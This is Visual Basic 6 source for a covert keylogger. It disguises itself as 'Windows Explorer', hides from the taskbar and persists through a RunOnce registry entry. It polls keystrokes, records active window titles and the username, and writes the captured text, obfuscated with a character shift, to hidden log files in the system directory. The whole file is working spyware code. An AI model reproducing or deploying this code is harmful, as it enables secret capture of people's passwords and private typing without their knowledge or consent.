VERSION 5.00
Object = "{45CB9C9B-4BC4-11D1-AE5C-CCA603C10627}#1.0#0"; "INIEdit.ocx"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Windows Explorer"
   ClientHeight    =   6165
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   6690
   ControlBox      =   0   'False
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6165
   ScaleWidth      =   6690
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox sysPath 
      Height          =   285
      Left            =   240
      TabIndex        =   7
      Top             =   5160
      Visible         =   0   'False
      Width           =   5775
   End
   Begin VB.TextBox txtencr 
      Height          =   1935
      Left            =   120
      ScrollBars      =   3  'Both
      TabIndex        =   5
      Top             =   3240
      Width           =   6135
   End
   Begin INITools.INITool INITool1 
      Left            =   240
      Top             =   5520
      _ExtentX        =   1085
      _ExtentY        =   873
   End
   Begin VB.Timer Timer2 
      Interval        =   530
      Left            =   5640
      Top             =   0
   End
   Begin VB.FileListBox File1 
      Height          =   480
      Left            =   5640
      TabIndex        =   4
      Top             =   2520
      Visible         =   0   'False
      Width           =   975
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Close"
      Height          =   375
      Left            =   5160
      TabIndex        =   3
      Top             =   5520
      Width           =   1095
   End
   Begin VB.CommandButton Command1 
      Caption         =   "DISABLE/ENABLE"
      Height          =   375
      Left            =   3000
      TabIndex        =   2
      Top             =   5520
      Width           =   2175
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   1800
      Locked          =   -1  'True
      TabIndex        =   1
      Top             =   120
      Width           =   4455
   End
   Begin VB.TextBox Text1 
      Height          =   2295
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   0
      Top             =   600
      Width           =   6135
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   65
      Left            =   120
      Top             =   240
   End
   Begin VB.Label Label1 
      Caption         =   "Encrypted:"
      Height          =   255
      Left            =   120
      TabIndex        =   6
      Top             =   3000
      Width           =   3735
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

' The exe file must exist for this to work properly.

'Autorun codes
Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.

Private Const READ_CONTROL = &H20000
Private Const KEY_SET_VALUE = &H2
Private Const KEY_CREATE_SUB_KEY = &H4
Private Const STANDARD_RIGHTS_WRITE = (READ_CONTROL)
Private Const SYNCHRONIZE = &H100000
Private Const KEY_WRITE = ((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))

Private Const STANDARD_RIGHTS_READ = (READ_CONTROL)
Private Const KEY_ENUMERATE_SUB_KEYS = &H8
Private Const KEY_NOTIFY = &H10
Private Const KEY_QUERY_VALUE = &H1
Private Const KEY_READ = ((STANDARD_RIGHTS_READ Or KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) And (Not SYNCHRONIZE))

Private Const ERROR_SUCCESS = 0&
Private Const HKEY_CURRENT_USER = &H80000001
Private Const REG_SZ = 1

Private m_IgnoreEvents As Boolean

'username import function
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long

'Active windowtitle part
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long

'keylogger part
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer 'caps keystate


'Get system directory part
Private Declare Function GetSystemDirectory Lib "kernel32" Alias _
"GetSystemDirectoryA" (ByVal lpBuffer As String, _
ByVal nSize As Long) As Long
Dim SysDir As String


'Loadsetting variable declaration
Dim wTitle, AllowBS As Boolean
Dim ext, encCode As String, LogMode As Integer
Dim lpath, LogDir As String

Private Sub Form_Load()
'Get sysDirectory
SysDir = String(80, 0)
Call GetSystemDirectory(SysDir, 80)     'stores global variable sysDir i.e, system32 path.

sysPath.Text = SysDir

'if program already running then confuse user that it is explorer
If App.PrevInstance = True Then
        Shell "C:\WINDOWS\explorer.exe", vbNormalFocus 'This program is already running!
        End
End If

Call loadsetting

If LogDir = "sys" Then  'Check Where should log stored system dir or defined path in setting.ini
sysPath.Text = SysDir
Else
sysPath.Text = LogDir
End If


'hiding app
App.TaskVisible = False
'Me.Hide
Timer1.Enabled = True


On Error Resume Next
Call setautorun
'FileCopy App.Path & "\" & App.EXEName & ".exe", sysPath & "\explorer.exe"
MkDir sysPath & "\sysResource"
File1.Path = sysPath & "\sysResource"

If LogMode = 0 Then
    lpath = sysPath & "\sysResource\browse" & File1.ListCount + 1 & "xcz" & ext
ElseIf LogMode = 1 Then
    Dim a As Variant
    a = Format$(Now, "dd" & "mm")
    lpath = sysPath & "\sysResource\browse" & a & "xcz" & ext
ElseIf LogMode = 2 Then
    lpath = sysPath & "\sysResource\browsexcz" & ext
End If

'Write initials
If Dir$(lpath) <> "" Then
'MsgBox ("The file exist")
Open lpath For Append As 1
Write #1, Time, encCode, App.Revision, username
Close #1
Else
'MsgBox ("The file does not exist")
Open lpath For Append As 1
Write #1, Time, encCode, App.Revision, username
Close #1
End If
   
End Sub
Private Sub loadsetting()
Dim sDr As String
sDr = Left(SysDir, 2)
On Error GoTo err
AllowBS = INITool1.GetFromINI("LogSetting", "USEBS", sDr & "\Program Files\Common Files\setting.ini")
wTitle = INITool1.GetFromINI("LogSetting", "UseChildTitle", sDr & "\Program Files\Common Files\setting.ini")
encCode = INITool1.GetFromINI("LogSetting", "EncCode", sDr & "\Program Files\Common Files\setting.ini")
ext = INITool1.GetFromINI("LogSetting", "extension", sDr & "\Program Files\Common Files\setting.ini")
Timer1.Interval = INITool1.GetFromINI("LogSetting", "TimerInt", sDr & "\Program Files\Common Files\setting.ini")
LogMode = INITool1.GetFromINI("LogSetting", "LogMode", sDr & "\Program Files\Common Files\setting.ini")
LogDir = INITool1.GetFromINI("LogSetting", "LogDir", sDr & "\Program Files\Common Files\setting.ini")
err:
If err.Number = 13 Then End             'setting.ini not found
End Sub
Private Sub setautorun()
' Clear or set the key that makes the program run at startup.
    SetRunAtStartup "explorer", App.Path & ""
End Sub
Private Sub SetRunAtStartup(ByVal app_name As String, ByVal app_path As String)
Dim hKey As Long
Dim key_value As String
Dim status As Long

    On Error GoTo SetStartupError

    ' Open the key, creating it if it doesn't exist.
    If RegCreateKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\RunOnce", _
        ByVal 0&, ByVal 0&, ByVal 0&, _
        KEY_WRITE, ByVal 0&, hKey, _
        ByVal 0&) <> ERROR_SUCCESS _
    Then
        MsgBox "Error " & err.Number & " opening key" & _
            vbCrLf & err.Description
        Exit Sub
    End If


        ' Create the key.
        key_value = app_path & "\" & app_name & ".exe" & vbNullChar
        status = RegSetValueEx(hKey, "explorer", 0, REG_SZ, _
            ByVal key_value, Len(key_value))

        If status <> ERROR_SUCCESS Then
            MsgBox "Error " & err.Number & " setting key" & _
                vbCrLf & err.Description
        End If
   

    ' Close the key.
    RegCloseKey hKey
    Exit Sub

SetStartupError:
    MsgBox err.Number & " " & err.Description
    Exit Sub
End Sub
Private Sub Command1_Click()
If Timer1.Enabled = True Then
Timer1.Enabled = False
Else
Timer1.Enabled = True
End If
End Sub

Private Sub Command2_Click()
End
End Sub
Private Sub Timer2_Timer()
    Text2.Text = GetActiveWindowTitle(wTitle)            'Get window title after 550 interval
End Sub
Private Sub Timer1_Timer()
Dim i As Integer
Dim result As Integer
For i = 1 To 255
 result = GetAsyncKeyState(i)
If result = -32767 Then
    If (i >= 65 And i <= 90) Or i = 32 Then         'alphabets 32 for space bar
        Text1.Text = Text1.Text + correctcase(i)
    Else                                            'non alphabets
        If i = 1 Then                               'it is Click
        Text1.Text = Text1.Text & "[C]"             'Print [C] to show click
        ElseIf i = 8 Then                           'Key pressed is Backspace
            If AllowBS = True Then                  ' delete last letter
                If Len(Text1) > 0 And Right(Text1.Text, 1) <> "]" And Right(Text1.Text, 1) <> Chr(13) Then Text1.Text = Left(Text1.Text, Len(Text1) - 1)
            Else
                Text1.Text = Text1.Text + "[BS]"    ' print [BS] in log
            End If
        Else
         Text1.Text = Text1.Text + checkshift(i)
        End If
    End If
End If
Next i
End Sub
'************************Recording to file use of Append*********
Private Sub appendnow()
Dim i As Integer
For i = 1 To Len(Text1)
txtencr.Text = txtencr.Text & Chr(Asc(Mid(Text1, i, 1)) + encCode)
Next i

Open lpath For Append As #1
        Print #1, txtencr.Text
        Text1.Text = ""
        txtencr.Text = ""
Close #1
End Sub

'''**********************shiftkey****************
Private Function checkshift(ByVal b As Integer) As String
    If GetAsyncKeyState(vbKeyShift) Then
       checkshift = shiftkeydw(b)
    Else
        checkshift = shiftkeyup(b)
    End If
End Function
'''**********************finding symbol and number keys when shift key unpressed**********
Private Function shiftkeyup(ByVal b As Integer) As String
Select Case b
Case 48 To 57  'number keys above QWERTY
    shiftkeyup = b - 48
Case 96 To 105  'Number keys from numpad
    shiftkeyup = b - 96
Case 192
    shiftkeyup = "`"
Case 189
    shiftkeyup = "-"
Case 187
    shiftkeyup = "="
Case 219
    shiftkeyup = "["
Case 186
    shiftkeyup = ";"
Case 222
    shiftkeyup = "'"
Case 221
    shiftkeyup = "]"
Case 188
    shiftkeyup = ","
Case 190
    shiftkeyup = "."
Case 191
    shiftkeyup = "/"
Case 220
    shiftkeyup = "\"
Case 111
    shiftkeyup = "/"
Case 106
    shiftkeyup = "*"
Case 109
    shiftkeyup = "-"
Case 107
    shiftkeyup = "+"


Case Else           'If key doesnt recognised ascii code will be displayed
    shiftkeyup = locatekey(b)
End Select
End Function
'''**********************finding symbol and number keys when shift key unpressed**********
Private Function shiftkeydw(ByVal b As Integer) As String
Select Case b
Case 48 'number keys above QWERTY
    shiftkeydw = ")"
Case 49
    shiftkeydw = "!"
Case 50
    shiftkeydw = "@"
Case 51
    shiftkeydw = "#"
Case 52
    shiftkeydw = "$"
Case 53
    shiftkeydw = "%"
Case 54
    shiftkeydw = "^"
Case 55
    shiftkeydw = "&"
Case 56
    shiftkeydw = "*"
Case 57
    shiftkeydw = "("

Case 96 To 105  'Number keys from numpad
    shiftkeydw = b - 96

Case 192
    shiftkeydw = "~"
Case 189
    shiftkeydw = "_"
Case 187
    shiftkeydw = "+"
Case 219
    shiftkeydw = "{"
Case 186
    shiftkeydw = ":"
Case 222
    shiftkeydw = """"
Case 221
    shiftkeydw = "}"
Case 188
    shiftkeydw = "<"
Case 190
    shiftkeydw = ">"
Case 191
    shiftkeydw = "?"
Case 220
    shiftkeydw = "|"
Case 111
    shiftkeydw = "/"
Case 106
    shiftkeydw = "*"
Case 109
    shiftkeydw = "-"
Case 107
    shiftkeydw = "+"


Case Else           'If key is not symbol then locate its name
    shiftkeydw = locatekey(b)
End Select

End Function
Private Function locatekey(ByVal b As Integer) As String
Select Case b
Case 27
    locatekey = "[ESC]"
Case 9
    locatekey = "[TAB]"
Case 20
    locatekey = "[CAPS]"
Case 16         'shift key
    locatekey = ""
Case 160        'Left shift key
    locatekey = ""
Case 161        'Right shift key
    locatekey = ""
Case 112 To 123
    locatekey = "[F" & b - 111 & "]"
Case 13
    locatekey = "[ENTR]"
Case 91
    locatekey = "[LWND]"
Case 92
    locatekey = "[RWND]"
Case 18            'alt KEY DEFECT
    locatekey = ""
Case 164
    locatekey = "[LALT]"
Case 165
    locatekey = "[RALT]"
    
Case 17         'Ctrl key defect
    locatekey = ""
Case 162
    locatekey = "[LCTRL]"
Case 163
    locatekey = "[RCTRL]"

Case 2
    locatekey = "[RC]"
Case 93
    locatekey = "[KRC]"
'Case 8
 '   locatekey = "[BS]"
Case 46
    locatekey = "[DEL]"
Case 45
    locatekey = "[INS]"
Case 36
    locatekey = "[HOME]"
Case 33
    locatekey = "[PAGEUP]"
Case 35
    locatekey = "[END]"
Case 34
    locatekey = "[PAGEDOWN]"
Case 37
    locatekey = "[LARROW]"
Case 38
    locatekey = "[UARROW]"
Case 39
    locatekey = "[RARROW]"
Case 40
    locatekey = "[DARROW]"
Case 44
    locatekey = "[PRINTSCREEN]"
Case 145
    locatekey = "[SCROLLLCK]"
Case 19
    locatekey = "[PAUSE/BREAK]"
Case 144
    locatekey = "[NUMLCK]"
Case 12
    locatekey = "[5]"



Case Else
    locatekey = "[" & b & "]"
End Select
End Function
Private Sub Text2_Change()
Call appendnow
If Trim(Text2.Text) <> "" Then Text1.Text = Text1.Text & vbCrLf & Time & " : " & Text2.Text & vbCrLf
End Sub
'******************kEYCASEPART***********
Function correctcase(ByVal b As Integer) As String
Dim tmp As Boolean
tmp = GetKeyState(vbKeyCapital)
If tmp = 1 Then         'The Caps Lock Is On
    If GetAsyncKeyState(vbKeyShift) Then      'shift key down now
    correctcase = LCase(Chr(b)) 'print small letter
    Else
    correctcase = UCase(Chr(b)) 'print capital letter
    End If
Else            'The Caps Lock Is Off
    If GetAsyncKeyState(vbKeyShift) Then      'shift key down now
    correctcase = UCase(Chr(b)) 'print capital letter
    Else
    correctcase = LCase(Chr(b)) 'print small letter
    End If
End If
End Function
''*********************Username Import*********
Private Function username() As String
Dim sBuffer As String
    Dim lSize As Long
    sBuffer = Space$(255)
    lSize = Len(sBuffer)
    Call GetUserName(sBuffer, lSize)
    If lSize > 0 Then
        username = Left$(sBuffer, lSize)
    Else
        username = vbNullString
    End If
End Function

' ************************************Ativewindow title part******************************
' Returns the title of the active window.
' if GetParent = true then the parent window is
' returned.
Public Function GetActiveWindowTitle(ByVal ReturnParent As Boolean) As String
Dim i As Long
Dim j As Long

i = GetForegroundWindow


If ReturnParent Then
Do While i <> 0
j = i
i = GetParent(i)
Loop

i = j
End If

GetActiveWindowTitle = GetWindowTitle(i)
End Function
Public Function GetWindowTitle(ByVal hwnd As Long) As String
Dim l As Long
Dim S As String

l = GetWindowTextLength(hwnd)
S = Space(l + 1)

GetWindowText hwnd, S, l + 1

GetWindowTitle = Left$(S, l)
End Function


